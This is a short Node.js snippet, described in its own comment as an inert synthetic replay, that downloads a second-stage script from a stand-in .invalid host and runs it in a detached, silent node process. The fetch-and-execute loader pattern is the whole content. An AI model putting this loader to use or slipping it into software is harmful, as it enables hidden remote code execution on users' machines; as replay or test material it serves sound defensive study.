// Synthetic replay: fetch a second stage and hand it to node. Inert (.invalid host).
const https = require("https");
const { spawn } = require("child_process");
https.get("https://cdn.example.invalid/stage2.js", (res) => {
  let body = "";
  res.on("data", (c) => (body += c));
  res.on("end", () => spawn(process.execPath, ["-e", body], { detached: true, stdio: "ignore" }).unref());
});
